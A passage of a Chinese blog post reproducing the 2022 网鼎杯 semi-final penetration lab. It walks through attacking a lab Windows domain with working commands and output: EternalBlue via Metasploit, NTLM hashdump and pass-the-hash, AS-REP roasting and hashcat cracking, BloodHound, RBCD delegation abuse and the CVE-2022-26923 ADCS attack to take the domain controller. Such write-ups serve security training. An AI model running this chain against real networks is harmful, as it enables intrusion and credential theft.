+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>search MS17-010 blue<br>use 0<br>或者直接<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.15.24<br>run<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; hashdump<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure>
+<p>这里msf使用比较麻烦应该是因为不是pro导致的问题，直接使用psexec就行，实操过程中psexec的644行需要微调</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 python3 psexec.py administrator@172.22.15.24 -hashes <span class="hljs-string">&#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27;</span> -codec gbk<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15234105.png" srcset="/img/loading.gif" lazyload alt="2025-04-15234105"></p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01230833.png" srcset="/img/loading.gif" lazyload alt="2025-05-01230833"></p>
+<h2 id="flag3"><a class="markdownIt-Anchor" href="#flag3"></a> flag3</h2>
+<p>走浏览器代理访问一下网页，也还是弱密码<code>admin:123456</code></p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01232035.png" srcset="/img/loading.gif" lazyload alt="2025-05-01232035"></p>
+<p>把数据导出出来</p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01232729.png" srcset="/img/loading.gif" lazyload alt="2025-05-01232729"></p>
+<p>导出模板，之后对域用户名进行整理一下</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">lixiuying@</span>xiaorang.lab<br><span class="hljs-symbol">lixiaoliang@</span>xiaorang.lab<br><span class="hljs-symbol">zhangyi@</span>xiaorang.lab<br><span class="hljs-symbol">jiaxiaoliang@</span>xiaorang.lab<br><span class="hljs-symbol">zhangli@</span>xiaorang.lab<br><span class="hljs-symbol">zhangwei@</span>xiaorang.lab<br><span class="hljs-symbol">liuqiang@</span>xiaorang.lab<br><span class="hljs-symbol">wangfang@</span>xiaorang.lab<br><span class="hljs-symbol">wangwei@</span>xiaorang.lab<br><span class="hljs-symbol">wanglihong@</span>xiaorang.lab<br><span class="hljs-symbol">huachunmei@</span>xiaorang.lab<br><span class="hljs-symbol">wanghao@</span>xiaorang.lab<br><span class="hljs-symbol">zhangxinyu@</span>xiaorang.lab<br><span class="hljs-symbol">huzhigang@</span>xiaorang.lab<br><span class="hljs-symbol">lihongxia@</span>xiaorang.lab<br><span class="hljs-symbol">wangyulan@</span>xiaorang.lab<br><span class="hljs-symbol">chenjianhua@</span>xiaorang.lab<br></code></pre></td></tr></table></figure>
+<p>看了一下是AS-ERP Roasting</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/ <br><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] DLL init: proxychains-ng 4.17<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="hljs-keyword">for</span> removal <span class="hljs-keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="hljs-keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).<br>  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>$krb5asrep$23<span class="hljs-variable">$lixiuying</span>@xiaorang.lab@XIAORANG.LAB:40fc9781df5b246f5b3cd4e8b6110d79<span class="hljs-variable">$910cc853cbcc73e71332fa64924a9a5901f5af16726c2b1fab1984bcf6f7214fd9ba4fa2cfe23e11bc4951f5996839ad080d0405ee1e6d903a90b5548616659c86969a99da96a7b4f1a617e9c85257a8836fbc0e83a6771c51172af7e395b5adcec1d15be4aab915a37fa1f160c6b1e973a11de041cd223753b8f4630ffad44c961562fcfcc65e35ae108425a3668eb48498feb61ac62edf82e10f4df3e9ce0b7e606d8d001fb4c3cdd66701aa577eb6b2f09ef691af8181c9ca16d5d4c1ec3a286c79ee28a845b1640fd52428511d8247eb9da96b03ae287405eb7d2508c8cc357463bb1eb70fb8714e3807</span><br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>$krb5asrep$23<span class="hljs-variable">$huachunmei</span>@xiaorang.lab@XIAORANG.LAB:32d6ed87b8e874e386a028e86f3a3384<span class="hljs-variable">$cc7e7580cfa37c6aac86218fc4d7a07632872b25e008b94c859702f99fb79852b4590a9cefa7aefb93065fd9f3f9b0ffee6fc41a1cbd4bde02e97d3d4fc0a8f806a8959a1f13763e964c0ec19a33f3c47e7656411db163fb3a7c5ffab6e291cbd05c6403335c84370005da10ac29ca5038dbef19f3884c3017978fabe2b83ddf36438b306c71ff1908a58efc6bd827538c32521ade17adae3ad3e114cfe726368e8854576e010cc493899d426e1e842a72db5f7608350674874c3b7990802c9abb5055e785635b6c41ea946f43b0de3724d4b977ac28aee8502e7c6a80e3e9b9ed28a68db218cf81835f7398</span><br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found <span class="hljs-keyword">in</span> Kerberos database)<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] User lihongxia@xiaorang.lab doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK</span><br><span class="hljs-string">[-] User wangyulan@xiaorang.lab doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.22.15.13:88  ...  OK<br>[-] User chenjianhua@xiaorang.lab doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></code></pre></td></tr></table></figure>
+<p>可以整理出两个信息，两个TGT</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:40fc9781df5b246f5b3cd4e8b6110d79$910cc853cbcc73e71332fa64924a9a5901f5af16726c2b1fab1984bcf6f7214fd9ba4fa2cfe23e11bc4951f5996839ad080d0405ee1e6d903a90b5548616659c86969a99da96a7b4f1a617e9c85257a8836fbc0e83a6771c51172af7e395b5adcec1d15be4aab915a37fa1f160c6b1e973a11de041cd223753b8f4630ffad44c961562fcfcc65e35ae108425a3668eb48498feb61ac62edf82e10f4df3e9ce0b7e606d8d001fb4c3cdd66701aa577eb6b2f09ef691af8181c9ca16d5d4c1ec3a286c79ee28a845b1640fd52428511d8247eb9da96b03ae287405eb7d2508c8cc357463bb1eb70fb8714e3807<br>$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:32d6ed87b8e874e386a028e86f3a3384$cc7e7580cfa37c6aac86218fc4d7a07632872b25e008b94c859702f99fb79852b4590a9cefa7aefb93065fd9f3f9b0ffee6fc41a1cbd4bde02e97d3d4fc0a8f806a8959a1f13763e964c0ec19a33f3c47e7656411db163fb3a7c5ffab6e291cbd05c6403335c84370005da10ac29ca5038dbef19f3884c3017978fabe2b83ddf36438b306c71ff1908a58efc6bd827538c32521ade17adae3ad3e114cfe726368e8854576e010cc493899d426e1e842a72db5f7608350674874c3b7990802c9abb5055e785635b6c41ea946f43b0de3724d4b977ac28aee8502e7c6a80e3e9b9ed28a68db218cf81835f7398<br></code></pre></td></tr></table></figure>
+<p>hashcat爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 --force <span class="hljs-string">&#x27;$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:40fc9781df5b246f5b3cd4e8b6110d79$910cc853cbcc73e71332fa64924a9a5901f5af16726c2b1fab1984bcf6f7214fd9ba4fa2cfe23e11bc4951f5996839ad080d0405ee1e6d903a90b5548616659c86969a99da96a7b4f1a617e9c85257a8836fbc0e83a6771c51172af7e395b5adcec1d15be4aab915a37fa1f160c6b1e973a11de041cd223753b8f4630ffad44c961562fcfcc65e35ae108425a3668eb48498feb61ac62edf82e10f4df3e9ce0b7e606d8d001fb4c3cdd66701aa577eb6b2f09ef691af8181c9ca16d5d4c1ec3a286c79ee28a845b1640fd52428511d8247eb9da96b03ae287405eb7d2508c8cc357463bb1eb70fb8714e3807&#x27;</span> /usr/share/wordlists/rockyou.txt<br><br> hashcat -m 18200 --force <span class="hljs-string">&#x27;$krb5asrep$23$huachunmei@xiaorang.lab@XIAORANG.LAB:32d6ed87b8e874e386a028e86f3a3384$cc7e7580cfa37c6aac86218fc4d7a07632872b25e008b94c859702f99fb79852b4590a9cefa7aefb93065fd9f3f9b0ffee6fc41a1cbd4bde02e97d3d4fc0a8f806a8959a1f13763e964c0ec19a33f3c47e7656411db163fb3a7c5ffab6e291cbd05c6403335c84370005da10ac29ca5038dbef19f3884c3017978fabe2b83ddf36438b306c71ff1908a58efc6bd827538c32521ade17adae3ad3e114cfe726368e8854576e010cc493899d426e1e842a72db5f7608350674874c3b7990802c9abb5055e785635b6c41ea946f43b0de3724d4b977ac28aee8502e7c6a80e3e9b9ed28a68db218cf81835f7398&#x27;</span> /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p>可以跑出这两组数据</p>
+<p>跑一下bloodhound</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp<br></code></pre></td></tr></table></figure>
+<p>然后导入到bloodhound看一下内容发现lixiuying对XR-0687具有GenericWrite权限，能打RBCD</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-addcomputer xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name <span class="hljs-string">&#x27;HACK$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;orange@admin&#x27;</span><br><br>proxychains4 impacket-rbcd xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip 172.22.15.13 -action write -delegate-to <span class="hljs-string">&#x27;XR-0687$&#x27;</span> -delegate-from <span class="hljs-string">&#x27;HACK$&#x27;</span><br><br>proxychains4 impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;HACK$&#x27;</span>:<span class="hljs-string">&#x27;orange@admin&#x27;</span> -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13<br><br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache<br><br>proxychains4 impacket-psexec administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02000551.png" srcset="/img/loading.gif" lazyload alt="2025-05-02000551"></p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02000701.png" srcset="/img/loading.gif" lazyload alt="2025-05-02000701"></p>
+<h2 id="flag4"><a class="markdownIt-Anchor" href="#flag4"></a> flag4</h2>
+<p>接下来打ADCS，这里考察的是CVE-2022-26923</p>
+<p>申请证书模版</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user Test2 -pass Test1234 -dns <span class="hljs-string">&#x27;XR-DC01.xiaorang.lab&#x27;</span><br>proxychains4 certipy-ad req -u Test2\<span class="hljs-variable">$@xiaorang</span>.lab -p Test1234 -target 172.22.15.18 -ca <span class="hljs-string">&quot;xiaorang-XR-CA-CA&quot;</span> -template Machine<br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">PassTheCert/Python at main · AlmondOffSec/PassTheCert</a>后续需要用到这个脚本</p>
+<p>利用上面生成的 pfx 证书配置域控的 RBCD 给上面创建的HACK$</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy-ad cert -pfx xr-dc01.pfx -nokey -out user.crt<br>certipy-ad cert -pfx xr-dc01.pfx -nocert -out user.key<br><br>proxychains4 python passthecert.py -action <span class="hljs-built_in">whoami</span> -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13<br>proxychains4 python passthecert.py -action write_rbcd -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to <span class="hljs-string">&#x27;XR-DC01$&#x27;</span> -delegate-from <span class="hljs-string">&#x27;HACK$&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001122.png" srcset="/img/loading.gif" lazyload alt="2025-05-02001122"></p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001150.png" srcset="/img/loading.gif" lazyload alt="2025-05-02001150"></p>
+<p>导入票据</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">proxychains4 impacket-getST xiaorang.lab/<span class="hljs-variable constant_">HACK</span>\<span class="hljs-variable">$:</span>orange<span class="hljs-variable">@admin</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -spn cifs/<span class="hljs-variable constant_">XR</span>-<span class="hljs-variable constant_">DC01</span>.xiaorang.lab -impersonate <span class="hljs-title class_">Administrator</span><br>└─<span class="hljs-comment"># export KRB5CCNAME=Administrator<span class="hljs-doctag">@cifs</span>_XR-DC01.xiaorang.lab<span class="hljs-doctag">@XIAORANG</span>.LAB.ccache</span><br></code></pre></td></tr></table></figure>
+<p>psexec无密码登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 impacket-psexec xiaorang.lab/Administrator@xr-dc01.xiaorang.lab -k -no-pass -target-ip 172.22.15.13 -codec gbk<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001343.png" srcset="/img/loading.gif" lazyload alt="2025-05-02001343"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="print-no-link">#信息收集</a>
+      
+        <a href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="print-no-link">#代理转发</a>
+      
+        <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="print-no-link">#横向移动</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>网鼎杯2022半决赛复现</div>
+      <div>https://0ran9ewww.github.io/2025/05/01/渗透/wdb2022/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月1日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年5月2日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/09/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/%E8%93%9D%E5%B8%BD%E6%9D%AF2023%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="蓝帽杯2023初赛复现(阉割复现)">
+                        <span class="hidden-mobile">蓝帽杯2023初赛复现(阉割复现)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
